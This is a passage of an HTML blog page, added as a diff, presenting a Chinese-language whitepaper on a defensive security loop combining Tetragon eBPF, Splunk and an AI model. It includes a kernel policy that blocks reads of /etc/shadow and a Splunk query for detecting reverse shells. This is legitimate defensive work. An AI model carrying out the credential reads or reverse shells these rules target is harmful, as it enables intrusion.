@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"weiborao.link","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="下一代安全闭环架构：eBPF + Splunk + AI              :root {             --cisco-blue: #00BCEB;             --cisco-navy: #1B252E;             --cisco-green: #25C266;             --cisco-purple:">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Rao Weibo的博客">
+<meta property="og:url" content="https://weiborao.link/secloop.html">
+<meta property="og:site_name" content="Rao Weibo的博客">
+<meta property="og:description" content="下一代安全闭环架构：eBPF + Splunk + AI              :root {             --cisco-blue: #00BCEB;             --cisco-navy: #1B252E;             --cisco-green: #25C266;             --cisco-purple:">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-14T11:18:11.551Z">
+<meta property="article:modified_time" content="2025-12-12T13:03:19.878Z">
+<meta property="article:author" content="Rao Weibo">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://weiborao.link/secloop.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"zh-CN","comments":true,"permalink":"https://weiborao.link/secloop.html","path":"secloop.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Rao Weibo的博客
+</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Rao Weibo的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">26</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a></li><li class="menu-item menu-item-works"><a href="/works/" rel="section"><i class="fa fa-sitemap fa-fw"></i>works</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">下一代安全闭环架构白皮书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">01. 架构总览 (Architecture Overview)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">核心价值 (Key Value)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">NIST CSF 2.0 &amp; MITRE ATT&amp;CK 映射 (Mapping)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.3.</span> <span class="nav-text">02. 技术深潜 - Tetragon (eBPF)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.4.</span> <span class="nav-text">WHAT原理与架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.5.</span> <span class="nav-text">WHY为何选择 Tetragon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.6.</span> <span class="nav-text">HOWTracingPolicy 示例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.6.1.</span> <span class="nav-text">技术图解：内核态 vs 用户态 (Kernel Space vs User Space)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.7.</span> <span class="nav-text">03. 技术深潜 - Splunk (Correlation)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.8.</span> <span class="nav-text">数据流水线 (Data Pipeline)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.8.1.</span> <span class="nav-text">关键配置 (Inputs.conf)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.9.</span> <span class="nav-text">SPL (Search Processing Language) 实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.9.1.</span> <span class="nav-text">Data Normalization (CIM)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.9.2.</span> <span class="nav-text">Adaptive Response</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.9.3.</span> <span class="nav-text">Performance Metrics</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">50k</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">&lt;2s</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.1.</span> <span class="nav-text">04. 技术深潜 - Foundation-sec-8B (The Brain)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.2.</span> <span class="nav-text">模型概览 (Model Profile)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.</span> <span class="nav-text">RAG 机制 (Retrieval-Augmented Generation)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.4.</span> <span class="nav-text">交互示例：自动研判与策略生成</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.4.1.</span> <span class="nav-text">Step 1: Ingestion</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.4.2.</span> <span class="nav-text">Step 2: Reasoning</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.4.3.</span> <span class="nav-text">Step 3: Response</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.</span> <span class="nav-text">05. 场景一：主机敏感文件读取闭环</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.6.</span> <span class="nav-text">场景描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.7.</span> <span class="nav-text">传统架构 vs IDPR 闭环架构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.7.1.</span> <span class="nav-text">攻击视角 (Attacker View)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.7.2.</span> <span class="nav-text">防御视角 (Splunk Log)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.8.</span> <span class="nav-text">06. 场景二：内网蜜罐与“幽灵录制”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.9.</span> <span class="nav-text">概念：Ghost Recording (幽灵录制)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.10.</span> <span class="nav-text">Splunk + AI 归因分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.10.1.</span> <span class="nav-text">数据流转图：从内核到取证 (From Kernel to Forensics)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.11.</span> <span class="nav-text">07. 场景三 &amp; 总结 (Summary)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.12.</span> <span class="nav-text">场景三：供应链软件基线漂移检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">4.12.1.</span> <span class="nav-text">IDPR 化学反应 (The &quot;Chemical Reaction&quot;)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.13.</span> <span class="nav-text">总结：IDPR 闭环优势矩阵</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Rao Weibo</p>
+  <div class="site-description" itemprop="description">记录一些工作、学习相关的笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/weiborao" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;weiborao" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:raoweibo@gmail.com" title="E-Mail → mailto:raoweibo@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner page posts-expand">
+
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN"><header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">
+</h1>
+
+<div class="post-meta-container">
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>下一代安全闭环架构：eBPF + Splunk + AI</title>
+    <style>
+        :root {
+            --cisco-blue: #00BCEB;
+            --cisco-navy: #1B252E;
+            --cisco-green: #25C266;
+            --cisco-purple: #9232ac;
+            --cisco-gray: #58585B;
+            --bg-light: #F4F5F7;
+            --white: #FFFFFF;
+            --font-main: 'Helvetica Neue', Arial, 'Microsoft YaHei', sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background-color: #E0E0E0;
+            color: var(--cisco-navy);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* A4 Landscape Definition */
+        .page-container {
+            width: 297mm;
+            /* height: 210mm; Intentionally auto to allow slight overflow in web view, strictly cut in print */
+            min-height: 210mm;
+            background: var(--white);
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            padding: 15mm;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Typography & Utilities */
+        h1, h2, h3, h4 { font-weight: 700; line-height: 1.2; }
+        h1 { font-size: 24pt; color: var(--cisco-navy); margin-bottom: 10px; }
+        h2 { font-size: 18pt; color: var(--cisco-blue); margin-bottom: 15px; border-bottom: 2px solid var(--cisco-blue); padding-bottom: 5px; }
+        h3 { font-size: 14pt; margin-bottom: 8px; color: var(--cisco-navy); }
+        p { font-size: 10pt; line-height: 1.4; margin-bottom: 10px; color: #333; text-align: justify; }
+        small { font-size: 8pt; color: var(--cisco-gray); }
+        
+        .header-strip {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .logo-area {
+            font-weight: 900;
+            font-size: 16pt;
+            color: var(--cisco-navy);
+            letter-spacing: -0.5px;
+        }
+        
+        .logo-area span { color: var(--cisco-blue); }
+
+        .page-number {
+            position: absolute;
+            bottom: 10mm;
+            right: 15mm;
+            font-size: 9pt;
+            color: var(--cisco-gray);
+        }
+
+        .page-author {
+            position: absolute;
+            bottom: 10mm;
+            left: 15mm;
+            font-size: 9pt;
+            color: var(--cisco-gray);
+            font-style: italic;
+        }
+
+        /* Layout Grids */
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+        .grid-4 { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; }
+        .col-span-2 { grid-column: span 2; }
+
+        /* Components */
+        .card {
+            background: var(--bg-light);
+            border-radius: 8px;
+            padding: 15px;
+            border-left: 4px solid var(--cisco-blue);
+        }
+        
+        .card.purple { border-left-color: var(--cisco-purple); }
+        .card.green { border-left-color: var(--cisco-green); }
+        .card.navy { border-left-color: var(--cisco-navy); background: #eef0f2; }
+
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 8pt;
+            font-weight: bold;
+            color: white;
+            background: var(--cisco-gray);
+            margin-right: 5px;
+        }
+        .bg-blue { background: var(--cisco-blue); }
+        .bg-green { background: var(--cisco-green); }
+        .bg-purple { background: var(--cisco-purple); }
+        .bg-navy { background: var(--cisco-navy); }
+
+        .code-block {
+            font-family: 'Consolas', 'Monaco', monospace;
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 9pt;
+            white-space: pre-wrap;
+            overflow-x: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .keyword { color: #ff79c6; }
+        .string { color: #f1fa8c; }
+        .function { color: #8be9fd; }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 9pt;
+            margin-bottom: 10px;
+        }
+        th { background: var(--cisco-navy); color: white; padding: 8px; text-align: left; }
+        td { border: 1px solid #ddd; padding: 6px; }
+        tr:nth-child(even) { background: #f9f9f9; }
+
+        /* SVG Containers */
+        .diagram-container {
+            width: 100%;
+            height: 180px;
+            background: white;
+            border: 1px dashed #ccc;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        /* Print Specifics */
+        @media print {
+            body { 
+                background: white; 
+                padding: 0; 
+                display: block;
+            }
+            .page-container {
+                width: 297mm;
+                height: 209mm; /* Slightly less than 210mm to prevent spillover */
+                box-shadow: none;
+                margin: 0;
+                page-break-after: always;
+                border: none;
+            }
+            .page-container:last-child {
+                page-break-after: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PAGE 1: Architecture Overview -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div style="text-align: right;">
+                <h3>下一代安全闭环架构白皮书</h3>
+                <small>eBPF (Tetragon) | Splunk | Foundation-sec-8B (LLM)</small>
+            </div>
+        </div>
+
+        <div class="grid-2" style="grid-template-columns: 2fr 1fr; margin-bottom: 20px;">
+            <div>
+                <h2>01. 架构总览 (Architecture Overview)</h2>
+                <p>本架构方案提出了一种基于 NIST CSF 2.0 和 MITRE ATT&CK 框架的动态闭环安全模型。核心在于利用 <strong>eBPF (Tetragon)</strong> 极其深入的内核可见性作为神经末梢，<strong>Splunk</strong> 作为具备大规模关联分析能力的海马体（记忆中枢），以及 <strong>Foundation-sec-8B</strong> 大模型作为推理决策的大脑皮层，形成 <strong>IDPR (Identify, Detect, Protect, Respond)</strong> 的毫秒级响应闭环。</p>
+            </div>
+            <div class="card navy">
+                <h3>核心价值 (Key Value)</h3>
+                <ul style="font-size: 9pt; padding-left: 20px; line-height: 1.6;">
+                    <li><strong>内核级阻断：</strong> 摆脱用户态 Hook 被绕过的风险。</li>
+                    <li><strong>语境化分析：</strong> LLM 理解攻击上下文，减少误报。</li>
+                    <li><strong>自动闭环：</strong> 从感知到处置全自动化。</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- SVG Architecture Diagram -->
+        <div class="diagram-container" style="height: 280px; border: none;">
+            <svg width="800" height="280" viewBox="0 0 800 280">
+                <!-- Background Blocks -->
+                <rect x="50" y="40" width="200" height="200" rx="10" fill="#E1F5FE" stroke="#00BCEB" stroke-width="2"/>
+                <rect x="300" y="40" width="200" height="200" rx="10" fill="#E8F5E9" stroke="#25C266" stroke-width="2"/>
+                <rect x="550" y="40" width="200" height="200" rx="10" fill="#F3E5F5" stroke="#9232ac" stroke-width="2"/>
+
+                <!-- Labels -->
+                <text x="150" y="30" text-anchor="middle" font-weight="bold" fill="#00BCEB">PERCEPTION (感知/执行)</text>
+                <text x="400" y="30" text-anchor="middle" font-weight="bold" fill="#25C266">MEMORY (记忆/关联)</text>
+                <text x="650" y="30" text-anchor="middle" font-weight="bold" fill="#9232ac">DECISION (决策/推理)</text>
+
+                <!-- Inner Components -->
+                <rect x="70" y="70" width="160" height="50" rx="5" fill="#fff" stroke="#00BCEB"/>
+                <text x="150" y="100" text-anchor="middle" font-size="14">Tetragon (eBPF)</text>
+                <text x="150" y="115" text-anchor="middle" font-size="10" fill="#666">Kernel Hooks & Kprobes</text>
+
+                <rect x="320" y="70" width="160" height="50" rx="5" fill="#fff" stroke="#25C266"/>
+                <text x="400" y="100" text-anchor="middle" font-size="14">Splunk Enterprise</text>
+                <text x="400" y="115" text-anchor="middle" font-size="10" fill="#666">SIEM & SOAR</text>
+
+                <rect x="570" y="70" width="160" height="50" rx="5" fill="#fff" stroke="#9232ac"/>
+                <text x="650" y="100" text-anchor="middle" font-size="14">Foundation-sec-8B</text>
+                <text x="650" y="115" text-anchor="middle" font-size="10" fill="#666">LLM & RAG</text>
+
+                <!-- Flow Arrows -->
+                <path d="M 230 95 L 320 95" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                <text x="275" y="90" text-anchor="middle" font-size="10">JSON Logs</text>
+
+                <path d="M 480 95 L 570 95" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                <text x="525" y="90" text-anchor="middle" font-size="10">Alert Context</text>
+
+                <path d="M 650 120 L 650 180 L 150 180 L 150 120" stroke="#333" stroke-width="2" stroke-dasharray="5,5" marker-end="url(#arrow)" fill="none"/>
+                <text x="400" y="195" text-anchor="middle" font-size="10" font-weight="bold">Generated Policy (Auto-Enforce)</text>
+
+                <!-- Definitions -->
+                <defs>
+                    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+                        <path d="M0,0 L0,6 L9,3 z" fill="#333" />
+                    </marker>
+                </defs>
+            </svg>
+        </div>
+
+        <h3>NIST CSF 2.0 & MITRE ATT&CK 映射 (Mapping)</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th width="15%">NIST CSF 2.0</th>
+                    <th width="25%">核心组件 (Component)</th>
+                    <th width="30%">功能实现 (Functionality)</th>
+                    <th width="30%">覆盖 MITRE TTPs (示例)</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Identify</strong></td>
+                    <td>Splunk Asset DB / eBPF Discovery</td>
+                    <td>实时资产发现、进程树梳理、端口监听基线</td>
+                    <td>T1082 (Sys Info Discovery)</td>
+                </tr>
+                <tr>
+                    <td><strong>Protect</strong></td>
+                    <td>Tetragon Enforcement</td>
+                    <td><span class="badge bg-blue">SIGKILL</span> 内核级进程阻断、网络隔离</td>
+                    <td>T1204 (User Execution), T1059 (Command & Scripting)</td>
+                </tr>
+                <tr>
+                    <td><strong>Detect</strong></td>
+                    <td>Splunk SIEM + Tetragon Tracing</td>
+                    <td>异常系统调用检测、文件完整性监控 (FIM)</td>
+                    <td>T1003 (OS Credential Dumping), T1574 (Hijack Exec Flow)</td>
+                </tr>
+                <tr>
+                    <td><strong>Respond</strong></td>
+                    <td>Foundation-sec-8B (AI) + SOAR</td>
+                    <td>自动生成阻断策略、生成事件分析报告</td>
+                    <td>D3-DA (Detect Analysis), D3-ER (Response)</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="page-number">Page 1 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+    <!-- PAGE 2: Tetragon -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div><h3>02. 技术深潜 - Tetragon (eBPF)</h3></div>
+        </div>
+
+        <div class="grid-3" style="height: 100%;">
+            <!-- Col 1 -->
+            <div class="card">
+                <h3><span class="badge bg-blue">WHAT</span>原理与架构</h3>
+                <p>Tetragon 是基于 eBPF (Extended Berkeley Packet Filter) 的安全观测与执行工具。不同于传统的 ptrace 或 LD_PRELOAD，Tetragon 代码运行在<strong>内核沙箱</strong>中。</p>
+                <p><strong>核心机制：</strong></p>
+                <ul style="padding-left: 20px; font-size: 9pt;">
+                    <li><strong>Kprobes/Tracepoints：</strong> 挂载到关键内核函数（如 `sys_execve`, `tcp_connect`）。</li>
+                    <li><strong>In-Kernel Filtering：</strong> 数据在内核态即完成过滤，极大减少用户态上下文切换开销。</li>
+                    <li><strong>Ring Buffer：</strong> 高效向用户态传输事件。</li>
+                </ul>
+            </div>
+
+            <!-- Col 2 -->
+            <div class="card">
+                <h3><span class="badge bg-blue">WHY</span>为何选择 Tetragon</h3>
+                <p><strong>1. 透明性 (Transparency):</strong> 攻击者无法感知监控进程的存在，难以绕过（Bypass）。</p>
+                <p><strong>2. 性能 (Performance):</strong> 相比 Auditd，eBPF 对系统性能影响极低 (< 1%)，适合高并发生产环境。</p>
+                <p><strong>3. 主动防御 (Enforcement):</strong> 能够在系统调用完成<strong>之前</strong>进行拦截。例如，在 `openat` 返回文件句柄前直接发送 `SIGKILL` 终止进程。</p>
+            </div>
+
+            <!-- Col 3: Code -->
+            <div style="grid-column: span 1;">
+                <h3><span class="badge bg-blue">HOW</span>TracingPolicy 示例</h3>
+                <p>以下 YAML 定义了一个策略：禁止非 Root 用户读取 `/etc/shadow`。</p>
+                <div class="code-block">
+apiVersion: cilium.io/v1alpha1
+kind: <span class="function">TracingPolicy</span>
+metadata:
+  name: "block-shadow-read"
+spec:
+  kprobes:
+  - call: "sys_openat"
+    syscall: true
+    args:
+    - index: 1
+      type: "string"
+    selectors:
+    - matchArgs:      
+      - index: 1
+        operator: "Equal"
+        values:
+        - "/etc/shadow"
+      matchActions:
+      - action: <span class="keyword">Sigkill</span>
+      - action: Override
+        argError: -13 # EACCES</div>
+                <p><small>当匹配到读取 shadow 文件时，直接在内核态杀掉进程。</small></p>
+            </div>
+        </div>
+        
+        <div style="margin-top: 20px; border-top: 1px solid #ddd; padding-top: 10px;">
+             <h4>技术图解：内核态 vs 用户态 (Kernel Space vs User Space)</h4>
+             <div class="grid-4">
+                 <div style="text-align: center;">
+                     <div style="background: #e0e0e0; padding: 10px; margin-bottom: 5px;">App (Malware)</div>
+                     <div style="font-size: 20px;">⬇️ syscall</div>
+                 </div>
+                 <div style="text-align: center; border-left: 2px dashed #999;">
+                     <div style="background: var(--cisco-blue); color: white; padding: 10px; margin-bottom: 5px;">eBPF Hook</div>
+                     <small>Tetragon 检查参数</small>
+                 </div>
+                 <div style="text-align: center;">
+                     <div style="background: var(--cisco-navy); color: white; padding: 10px; margin-bottom: 5px;">Kernel Function</div>
+                     <small>sys_openat()</small>
+                 </div>
+                 <div style="text-align: center; border-left: 2px solid red;">
+                     <div style="color: red; font-weight: bold; margin-top: 10px;">ACTION: SIGKILL</div>
+                     <small>阻断发生，函数未执行</small>
+                 </div>
+             </div>
+        </div>
+
+        <div class="page-number">Page 2 of 7</div>
+        <div class="page-author">Author: Weibo Rao Generated through Gemini Canvas</div>
+    </div>
+
+    <!-- PAGE 3: Splunk -->
+    <div class="page-container">
+        <div class="header-strip">
+            <div class="logo-area">SEC<span>ARCH</span> / 2025</div>
+            <div><h3>03. 技术深潜 - Splunk (Correlation)</h3></div>
+        </div>
+
+        <div class="grid-2">
+            <div>
+                <h3>数据流水线 (Data Pipeline)</h3>
+                <p>Splunk 在此架构中不仅仅是日志存储，它是<strong>上下文关联引擎</strong>。Tetragon 产生的 JSON 日志通过 HEC (HTTP Event Collector) 高速通过管道进入。</p>
+                <div class="diagram-container" style="height: 120px;">
+                    <svg width="400" height="100" viewBox="0 0 400 100">
+                         <rect x="10" y="30" width="80" height="40" fill="#00BCEB" rx="4"/>
+                         <text x="50" y="55" text-anchor="middle" fill="white" font-size="10">Tetragon Agent</text>
+                         
+                         <path d="M 90 50 L 130 50" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                         
+                         <rect x="130" y="30" width="80" height="40" fill="#25C266" rx="4"/>
+                         <text x="170" y="55" text-anchor="middle" fill="white" font-size="10">Splunk HEC</text>
+
+                         <path d="M 210 50 L 250 50" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                         
+                         <rect x="250" y="20" width="80" height="60" fill="#1B252E" rx="4"/>
+                         <text x="290" y="55" text-anchor="middle" fill="white" font-size="10">Indexers</text>
+                    </svg>
+                </div>
+                <h4>关键配置 (Inputs.conf)</h4>
+                <div class="code-block">
+[http://tetragon_json]
+disabled = 0
+index = linux_kernel
+sourcetype = tetragon:events
+token = <span class="string">xxxx-xxxx-xxxx-xxxx</span></div>
+            </div>
+
+            <div>
+                <h3>SPL (Search Processing Language) 实战</h3>
+                <p>利用 SPL 将内核事件与业务逻辑关联。以下查询用于检测“反弹 Shell”行为：进程启动了 shell，且其父进程是非 shell 进程（如 httpd, java）。</p>
+                <div class="code-block">
+index=linux_kernel sourcetype=tetragon:events 
+process_exec.binary IN ("/bin/bash", "/bin/sh")
+| <span class="function">rename</span> process_exec.parent.binary as parent_bin
+| <span class="function">search</span> NOT parent_bin IN ("/bin/bash", "/usr/sbin/sshd")
+| <span class="function">stats</span> count, values(process_exec.arguments) as cmd, values(process_pod) as pod by host
